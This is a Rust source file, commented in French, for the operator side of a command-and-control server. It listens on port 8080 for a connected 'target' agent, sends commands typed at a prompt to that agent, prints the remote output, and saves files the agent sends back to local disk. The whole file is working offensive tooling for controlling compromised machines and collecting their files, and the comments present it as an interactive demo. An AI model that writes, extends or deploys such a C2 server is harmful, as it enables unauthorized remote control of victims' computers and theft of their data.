use tokio::net::TcpListener;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use std::error::Error;
use common::Message;
use std::io::{self, Write}; // On a besoin de io standard pour le clavier
use std::fs;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let addr = "0.0.0.0:8080";
    let listener = TcpListener::bind(addr).await?;
    
    println!("========================================");
    println!("   C2 SERVER READY - LISTENING ON 8080  ");
    println!("========================================");

    // On attend UN seul client pour l'instant pour la démo interactive
    let (socket, addr) = listener.accept().await?;
    println!(">>> NOUVELLE CIBLE CONNECTÉE : {}", addr);
    println!("(Tapez 'exit' pour quitter)\n");

    // On sépare le socket
    let (read_half, mut write_half) = socket.into_split();
    let mut reader = BufReader::new(read_half);
    let mut line = String::new();

    loop {
        // 1. Afficher le prompt (style hacker) ex: "C2@127.0.0.1> "
        print!("C2@{}> ", addr);
        io::stdout().flush()?; // Force l'affichage immédiat

        // 2. Lire ce que tu tapes au clavier
        let mut user_input = String::new();
        io::stdin().read_line(&mut user_input)?;
        let cmd_text = user_input.trim();

        if cmd_text.is_empty() { continue; }
        if cmd_text == "exit" || cmd_text == "quit" {
            println!("Fermeture de la session.");
            break;
        }

        // 3. Envoyer la commande à l'agent
        let msg = Message::Command(cmd_text.to_string());
        let mut json = serde_json::to_string(&msg).unwrap();
        json.push('\n');

        if write_half.write_all(json.as_bytes()).await.is_err() {
            println!("La cible s'est déconnectée !");
            break;
        }

        // 4. Attendre la réponse de l'agent
         line.clear();
        if reader.read_line(&mut line).await.unwrap_or(0) == 0 { break; }

        // --- MODIFICATION DEBUG : On affiche ce qu'on reçoit brut ---
        println!("DEBUG RAW REÇU : {}", line); 

        let response_json = line.trim();
        
        // On remplace le 'if let Ok' par un match pour voir l'erreur
        match serde_json::from_str::<Message>(response_json) {
            Ok(resp_msg) => {
                match resp_msg {
                    Message::Output(content) => {
                        println!("{}", content);
                    },
                    Message::File { name, content } => {
                        println!("Reçu fichier : {} ({} octets)", name, content.len());
                        match fs::write(&name, content) {
                            Ok(_) => println!("✅ Fichier enregistré !"),
                            Err(e) => println!("❌ Erreur écriture disque : {}", e),
                        }
                    },
                    Message::Error(err) => println!("ERREUR DISTANTE : {}", err),
                    _ => {} // On ignore Command ici
                }
            },
            Err(e) => {
                // ICI on verra si le JSON est cassé
                println!("❌ ERREUR DÉCODAGE JSON : {}", e);
            }
        }
    }

    Ok(())
}